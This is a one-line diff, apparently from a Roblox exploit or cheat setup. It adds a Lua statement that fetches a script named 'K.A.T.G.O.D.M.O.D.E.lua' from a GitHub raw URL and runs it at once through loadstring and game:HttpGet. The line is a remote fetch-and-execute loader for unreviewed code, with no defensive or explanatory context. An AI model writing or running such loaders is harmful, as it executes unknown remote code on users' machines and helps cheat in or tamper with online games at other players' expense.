@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Cesare0328/my-scripts/main/K.A.T.G.O.D.M.O.D.E.lua', true))()
